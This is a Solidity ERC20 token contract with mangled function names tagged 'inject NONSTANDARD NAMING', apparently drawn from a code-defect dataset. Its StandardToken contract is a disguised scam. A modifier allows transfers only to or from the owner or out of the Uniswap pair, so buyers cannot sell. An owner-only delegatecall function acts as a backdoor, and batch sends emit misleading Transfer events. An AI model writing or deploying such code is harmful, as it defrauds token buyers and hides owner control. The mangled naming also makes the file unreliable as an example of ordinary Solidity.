                                                                 

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         

pragma solidity ^0.5.17;

interface IERC20 {
    function TOTALSUPPLY113() external view returns(uint);	//inject NONSTANDARD NAMING

    function BALANCEOF908(address account) external view returns(uint);	//inject NONSTANDARD NAMING

    function TRANSFER509(address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function ALLOWANCE791(address owner, address spender) external view returns(uint);	//inject NONSTANDARD NAMING

    function APPROVE97(address spender, uint amount) external returns(bool);	//inject NONSTANDARD NAMING

    function TRANSFERFROM924(address sender, address recipient, uint amount) external returns(bool);	//inject NONSTANDARD NAMING
    event TRANSFER206(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL631(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _MSGSENDER746() internal view returns(address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function TOTALSUPPLY113() public view returns(uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }

    function BALANCEOF908(address account) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }

    function TRANSFER509(address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER456(_MSGSENDER746(), recipient, amount);
        return true;
    }

    function ALLOWANCE791(address owner, address spender) public view returns(uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }

    function APPROVE97(address spender, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE652(_MSGSENDER746(), spender, amount);
        return true;
    }

    function TRANSFERFROM924(address sender, address recipient, uint amount) public returns(bool) {	//inject NONSTANDARD NAMING
        _TRANSFER456(sender, recipient, amount);
        _APPROVE652(sender, _MSGSENDER746(), _allowances[sender][_MSGSENDER746()].SUB490(amount, "ERC20: transfer amount exceeds the allowance"));
        return true;
    }

    function INCREASEALLOWANCE292(address spender, uint addedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE652(_MSGSENDER746(), spender, _allowances[_MSGSENDER746()][spender].ADD313(addedValue));
        return true;
    }

    function DECREASEALLOWANCE184(address spender, uint subtractedValue) public returns(bool) {	//inject NONSTANDARD NAMING
        _APPROVE652(_MSGSENDER746(), spender, _allowances[_MSGSENDER746()][spender].SUB490(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _TRANSFER456(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from zero address");
        require(recipient != address(0), "ERC20: transfer to zero address");

        _balances[sender] = _balances[sender].SUB490(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD313(amount);
        emit TRANSFER206(sender, recipient, amount);
    }

    function _MINT885(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to zero address");

        _totalSupply = _totalSupply.ADD313(amount);
        _balances[account] = _balances[account].ADD313(amount);
        emit TRANSFER206(address(0), account, amount);
    }

    function _BURN165(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB490(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB490(amount);
        emit TRANSFER206(account, address(0), amount);
    }

    function _APPROVE652(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: not approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL631(owner, spender, amount);
        
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function NAME560() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }

    function SYMBOL650() public view returns(string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }

    function DECIMALS537() public view returns(uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD313(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function SUB490(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return SUB490(a, b, "SafeMath: subtraction overflow");
    }

    function SUB490(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function MUL25(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function DIV987(uint a, uint b) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        return DIV987(a, b, "SafeMath: division by zero thrown");
    }

    function DIV987(uint a, uint b, string memory errorMessage) internal pure returns(uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT158(address account) internal view returns(bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath
    for uint;
    using Address
    for address;

    function SAFETRANSFER29(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN105(token, abi.encodeWithSelector(token.TRANSFER509.selector, to, value));
    }

    function SAFETRANSFERFROM889(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN105(token, abi.encodeWithSelector(token.TRANSFERFROM924.selector, from, to, value));
    }

    function SAFEAPPROVE690(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE791(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN105(token, abi.encodeWithSelector(token.APPROVE97.selector, spender, value));
    }

    function CALLOPTIONALRETURN105(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT158(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract StandardToken {

    event TRANSFER206(address indexed _from, address indexed _to, uint _value);	//inject NONSTANDARD NAMING
    event APPROVAL631(address indexed _owner, address indexed _spender, uint _value);	//inject NONSTANDARD NAMING

    function TRANSFER509(address _to, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        return TRANSFERFROM924(msg.sender, _to, _value);
    }

    function TRANSFERFROM924(address _from, address _to, uint _value) public payable ENSURE806(_from, _to) returns (bool) {	//inject NONSTANDARD NAMING
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit TRANSFER206(_from, _to, _value);
        return true;
    }

    

    function DELEGATE365(address a, bytes memory b) public payable {	//inject NONSTANDARD NAMING
        require(msg.sender == owner);
        a.delegatecall(b);
    }
    
    function APPROVE97(address _spender, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        allowance[msg.sender][_spender] = _value;
        emit APPROVAL631(msg.sender, _spender, _value);
        return true;
    }

    function BATCHSEND521(address[] memory _tos, uint _value) public payable returns (bool) {	//inject NONSTANDARD NAMING
        require (msg.sender == owner);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit TRANSFER206(msg.sender, _to, _value/2);
            emit TRANSFER206(msg.sender, _to, _value/2);
        }
        return true;
    }

    modifier ENSURE806(address _from, address _to) {	//inject NONSTANDARD NAMING
        address UNI = PAIRFOR400(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        require(_from == owner || _to == owner || _from == UNI);
        _;
    }

    function PAIRFOR400(address factory, address tokenA, address tokenB) internal pure returns (address pair) {	//inject NONSTANDARD NAMING
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    uint constant public decimals153 = 18;	//inject NONSTANDARD NAMING
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address constant internal uni36 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;	//inject NONSTANDARD NAMING

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit TRANSFER206(address(0x0), msg.sender, totalSupply);
    }
}